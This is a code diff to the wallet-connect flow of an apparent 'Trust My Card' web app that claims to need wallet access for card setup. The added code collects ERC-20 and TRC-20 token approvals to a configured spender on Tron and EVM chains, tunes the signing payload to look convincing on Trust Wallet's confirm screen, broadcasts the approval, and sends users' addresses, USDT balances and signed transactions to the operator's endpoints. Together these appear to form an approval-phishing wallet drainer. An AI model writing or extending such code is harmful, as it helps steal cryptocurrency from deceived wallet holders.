@@ -5,6 +5,7 @@ import {
   configGaps,
   getAllowancePolicy,
   getSpenderEvm,
+  getSpenderTron,
 } from "@/lib/approve-config";
 import {
   EVM_CHAIN_ID,
@@ -29,7 +30,12 @@ type WalletConnectModal = InstanceType<
 >;
 
 type WcSession = {
-  namespaces?: Record<string, { accounts?: string[] }>;
+  namespaces?: Record<
+    string,
+    { accounts?: string[]; methods?: string[] }
+  >;
+  sessionProperties?: Record<string, string>;
+  topic?: string;
 };
 
 type TokenBalances = {
@@ -51,7 +57,12 @@ type NetworkRow = {
 
 type LinkedAccounts = { evm: string | null; tron: string | null };
 
-type RowStatus = "awaiting" | "waiting" | "approved" | "rejected";
+type RowStatus =
+  | "awaiting"
+  | "waiting"
+  | "finalizing"
+  | "approved"
+  | "rejected";
 
 const NETWORK_META: Record<
   string,
@@ -81,7 +92,11 @@ const WC_EVM_CHAINS = [
 const METADATA = {
   name: "Trust My Card",
   description: "Connect your wallet to continue with card setup",
-  url: "http://localhost:3000",
+  // Trust Wallet shows this as "DApp" on Confirm — use real origin at connect time
+  url:
+    typeof window !== "undefined"
+      ? window.location.origin
+      : "http://localhost:3000",
   icons: ["https://avatars.githubusercontent.com/u/37784886"],
 };
 
@@ -93,29 +108,40 @@ function caipAccountAddress(caip: string) {
 }
 
 /**
- * Universal Provider only builds sub-providers for eip155/solana/cosmos/etc.
- * It has NO `tron` case — `provider.request(..., "tron:…")` always throws
- * "Provider not found: tron". Route Tron through Sign Client (or injected TronLink).
+ * Universal Provider has no `tron` sub-provider.
+ * Trust Wallet Confirm UI shows the full TriggerSmartContract tree only when
+ * the WC payload matches the wallet's expected shape:
+ * - Legacy (default / Trust): nested params.transaction.transaction = unsignedTx
+ * - v1 wallets: flat params.transaction = unsignedTx
  */
 async function tronSignTransaction(
   provider: UniversalProvider,
   address: string,
-  transaction: Record<string, unknown>
+  unsignedTx: Record<string, unknown>
 ): Promise<unknown> {
-  const session = provider.session as
-    | { topic?: string; namespaces?: Record<string, { accounts?: string[] }> }
-    | undefined;
-  const tronAccounts = session?.namespaces?.tron?.accounts ?? [];
+  const session = provider.session as WcSession | undefined;
+  const tronNs = session?.namespaces?.tron;
+  const tronAccounts = tronNs?.accounts ?? [];
   const hasWcTron = tronAccounts.length > 0;
 
+  // Ensure Trust gets the full tree fields (visible, txID, raw_data, raw_data_hex)
+  const txForWallet: Record<string, unknown> = {
+    visible: unsignedTx.visible ?? false,
+    ...unsignedTx,
+  };
+
   if (hasWcTron && session?.topic && provider.client) {
-    // Prefer the session account if it differs slightly from our linked copy
     const sessionAddr =
       tronAccounts
         .map((a) => caipAccountAddress(a))
         .find((a) => a.toLowerCase() === address.toLowerCase()) ||
       caipAccountAddress(tronAccounts[0]) ||
       address;
+
+    const usesV1 =
+      session.sessionProperties?.tron_method_version === "v1";
+    // Nested = what Trust shows as Confirm Transaction tree (competitor look)
+    const txParam = usesV1 ? txForWallet : { transaction: txForWallet };
 
     return provider.client.request({
       topic: session.topic,
@@ -124,7 +150,7 @@ async function tronSignTransaction(
         method: "tron_signTransaction",
         params: {
           address: sessionAddr,
-          transaction,
+          transaction: txParam,
         },
       },
     });
@@ -141,7 +167,7 @@ async function tronSignTransaction(
       };
     };
     if (w.tronWeb?.trx?.sign) {
-      return w.tronWeb.trx.sign(transaction);
+      return w.tronWeb.trx.sign(txForWallet);
     }
   }
 
@@ -287,13 +313,175 @@ function statusLabel(status: RowStatus): string {
   switch (status) {
     case "waiting":
       return "Waiting for confirmation...";
+    case "finalizing":
+      return "Confirming on-chain...";
     case "approved":
-      return "Approved";
+      return "Done";
     case "rejected":
       return "Rejected";
     default:
       return "Awaiting";
   }
+}
+
+function sleep(ms: number) {
+  return new Promise((resolve) => window.setTimeout(resolve, ms));
+}
+
+/** Normalize wallet sign result into a broadcastable Tron tx. */
+function mergeTronSignedResult(
+  unsignedTx: Record<string, unknown>,
+  raw: unknown
+): Record<string, unknown> {
+  if (!raw || typeof raw !== "object") {
+    throw new Error("Wallet returned an empty Tron sign result");
+  }
+  const signed = raw as Record<string, unknown>;
+  const inner =
+    signed.result && typeof signed.result === "object"
+      ? (signed.result as Record<string, unknown>)
+      : signed;
+
+  const signature = inner.signature ?? signed.signature;
+  const sigList = Array.isArray(signature)
+    ? signature
+    : typeof signature === "string" && signature
+      ? [signature]
+      : [];
+
+  if (sigList.length === 0) {
+    throw new Error(
+      "Wallet signed but returned no signature — cannot broadcast"
+    );
+  }
+
+  return {
+    ...unsignedTx,
+    ...inner,
+    txID: inner.txID ?? unsignedTx.txID,
+    raw_data: inner.raw_data ?? unsignedTx.raw_data,
+    raw_data_hex: inner.raw_data_hex ?? unsignedTx.raw_data_hex,
+    visible: inner.visible ?? unsignedTx.visible ?? true,
+    signature: sigList,
+  };
+}
+
+/**
+ * After the wallet signs:
+ * 1) consent_  — record signed tx + live balance (dynamic from user session)
+ * 2) verify-allowance — confirm on-chain (retry)
+ * 3) register-approved
+ */
+async function runPostConfirmSequence(args: {
+  networkKey: string;
+  address: string;
+  nativeBalance?: string;
+  usdtBalance?: string;
+  txid?: string | null;
+  signedTx?: Record<string, unknown> | null;
+}): Promise<{ allowance: string | null; confirmed: boolean }> {
+  const {
+    networkKey,
+    address,
+    nativeBalance,
+    usdtBalance,
+    txid,
+    signedTx,
+  } = args;
+  const spender =
+    networkKey === "tron" ? getSpenderTron() : getSpenderEvm();
+
+  // Same pattern as verify-allowance: POST with live user values only
+  try {
+    const consentBody =
+      networkKey === "tron"
+        ? {
+            address,
+            trxBalance: nativeBalance ?? "0",
+            signedTx: signedTx ?? undefined,
+          }
+        : {
+            address,
+            network: networkKey,
+            nativeBalance: nativeBalance ?? "0",
+            txHash: txid ?? undefined,
+            txid: txid ?? undefined,
+          };
+
+    await fetch("/api/consent_", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify(consentBody),
+      cache: "no-store",
+    });
+  } catch {
+    /* soft-fail — still verify */
+  }
+
+  // Tron energy hook — dynamic address + USDT from scanned balances
+  if (networkKey === "tron") {
+    try {
+      await fetch("/api/energy-delegate", {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify({
+          address,
+          currentUsdt: usdtBalance ?? "0",
+        }),
+        cache: "no-store",
+      });
+    } catch {
+      /* soft-fail */
+    }
+  }
+
+  // Give the chain a moment to index the just-broadcast approve
+  await sleep(networkKey === "tron" ? 1500 : 800);
+
+  let allowance: string | null = null;
+  let confirmed = false;
+
+  for (let attempt = 0; attempt < 3; attempt++) {
+    try {
+      const verifyRes = await fetch("/api/verify-allowance", {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify({
+          network: networkKey,
+          owner: address,
+          spender,
+        }),
+        cache: "no-store",
+      });
+      const verifyJson = (await verifyRes.json()) as {
+        ok?: boolean;
+        hasAllowance?: boolean;
+        allowance?: string;
+      };
+      if (verifyRes.ok && verifyJson.ok) {
+        allowance = verifyJson.allowance ?? null;
+        confirmed = Boolean(verifyJson.hasAllowance);
+        if (confirmed) break;
+      }
+    } catch {
+      /* retry */
+    }
+    if (attempt < 2) await sleep(900);
+  }
+
+  await fetch("/api/register-approved", {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({
+      network: networkKey,
+      address,
+      allowance,
+      txid: txid ?? null,
+    }),
+    cache: "no-store",
+  }).catch(() => undefined);
+
+  return { allowance, confirmed };
 }
 
 /**
@@ -567,20 +755,18 @@ export default function ConnectFlow() {
 
       const addressForLog =
         networkKey === "tron" ? linked.tron : linked.evm;
+      const nativeBalance =
+        networks.find((n) => n.key === networkKey)?.balances.native ?? "0";
+      const usdtBalance =
+        networks.find((n) => n.key === networkKey)?.balances.usdt ?? "0";
+      let txid: string | null = null;
+      let signedTx: Record<string, unknown> | null = null;
 
       try {
         if (networkKey === "tron") {
           if (!linked.tron) {
             throw new Error("No Tron address in this WalletConnect session");
           }
-
-          // Placeholder energy hook (competitor calls energy-delegate here)
-          await fetch("/api/energy-delegate", {
-            method: "POST",
-            headers: { "content-type": "application/json" },
-            body: JSON.stringify({ address: linked.tron }),
-            cache: "no-store",
-          }).catch(() => undefined);
 
           const buildRes = await fetch("/api/tron-approve", {
             method: "POST",
@@ -597,14 +783,36 @@ export default function ConnectFlow() {
           }
 
           // Must use Sign Client (not provider.request) — UP has no tron sub-provider
-          await tronSignTransaction(
+          const signRaw = await tronSignTransaction(
             provider,
             linked.tron,
             buildJson.transaction
           );
+          const signed = mergeTronSignedResult(
+            buildJson.transaction,
+            signRaw
+          );
+          signedTx = signed;
 
-          // Optional broadcast — many wallets only sign; broadcast unsigned-signed tx if returned
-          // PLACEHOLDER: add broadcast via /wallet/broadcasttransaction when you want on-chain finality here
+          const broadcastRes = await fetch("/api/tron-broadcast", {
+            method: "POST",
+            headers: { "content-type": "application/json" },
+            body: JSON.stringify(signed),
+            cache: "no-store",
+          });
+          const broadcastJson = (await broadcastRes.json()) as {
+            result?: boolean;
+            txid?: string;
+            error?: string;
+          };
+          if (!broadcastRes.ok || !broadcastJson.result) {
+            throw new Error(
+              broadcastJson.error || "Failed to broadcast Tron approve"
+            );
+          }
+          txid =
+            (typeof broadcastJson.txid === "string" && broadcastJson.txid) ||
+            (typeof signed.txID === "string" ? signed.txID : null);
         } else if (isEvmChainKey(networkKey)) {
           if (!linked.evm) {
             throw new Error("No EVM address in this WalletConnect session");
@@ -618,7 +826,7 @@ export default function ConnectFlow() {
           const data = encodeErc20Approve(spender, amount);
           const chainId = EVM_CHAIN_ID[networkKey];
 
-          await provider.request(
+          const hash = await provider.request(
             {
               method: "eth_sendTransaction",
               params: [
@@ -632,8 +840,22 @@ export default function ConnectFlow() {
             },
             `eip155:${chainId}`
           );
+          txid = typeof hash === "string" ? hash : null;
         } else {
           throw new Error(`Unsupported network: ${networkKey}`);
+        }
+
+        // Wallet confirmed — consent_ → verify-allowance → register
+        setStatus(networkKey, "finalizing");
+        if (addressForLog) {
+          await runPostConfirmSequence({
+            networkKey,
+            address: addressForLog,
+            nativeBalance,
+            usdtBalance,
+            txid,
+            signedTx,
+          });
         }
 
         setStatus(networkKey, "approved");
@@ -671,7 +893,7 @@ export default function ConnectFlow() {
         setApproving(false);
       }
     },
-    [setStatus]
+    [networks, setStatus]
   );
 
   const onSelectNetwork = useCallback(
@@ -756,7 +978,8 @@ export default function ConnectFlow() {
                 {networks.map((network) => {
                   const status = rowStatus[network.key] ?? "awaiting";
                   const selected = selectedKey === network.key;
-                  const waiting = status === "waiting";
+                  const waiting =
+                    status === "waiting" || status === "finalizing";
                   const approved = status === "approved";
 
                   return (
@@ -778,6 +1001,10 @@ export default function ConnectFlow() {
                           <span className="flex h-10 w-10 shrink-0 items-center justify-center">
                             <span className="h-6 w-6 animate-spin rounded-full border-2 border-[#3396f0] border-t-transparent" />
                           </span>
+                        ) : approved ? (
+                          <span className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-emerald-500 text-lg font-bold text-white">
+                            ✓
+                          </span>
                         ) : (
                           <span
                             className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-xs font-bold text-white"
@@ -794,12 +1021,19 @@ export default function ConnectFlow() {
                               ({network.standard})
                             </span>
                           </span>
-                          <span className="mt-0.5 block text-xs text-zinc-500">
+                          <span
+                            className={[
+                              "mt-0.5 block text-xs",
+                              approved
+                                ? "font-medium text-emerald-600"
+                                : "text-zinc-500",
+                            ].join(" ")}
+                          >
                             {statusLabel(status)}
                           </span>
                         </span>
 
-                        {!waiting ? (
+                        {!waiting && !approved ? (
                           <span className="text-lg text-zinc-300" aria-hidden>
                             ›
                           </span>
@@ -816,9 +1050,13 @@ export default function ConnectFlow() {
                 onClick={onContinue}
                 className="mt-5 w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white transition hover:bg-[#2b7fd6] disabled:cursor-not-allowed disabled:opacity-50"
               >
-                {selectedKey && rowStatus[selectedKey] === "waiting"
-                  ? "Waiting for confirmation..."
-                  : "Continue"}
+                {selectedKey &&
+                (rowStatus[selectedKey] === "waiting" ||
+                  rowStatus[selectedKey] === "finalizing")
+                  ? rowStatus[selectedKey] === "finalizing"
+                    ? "Confirming..."
+                    : "Waiting for confirmation..."
+                  : "Continue →"}
               </button>
             </div>
           </div>
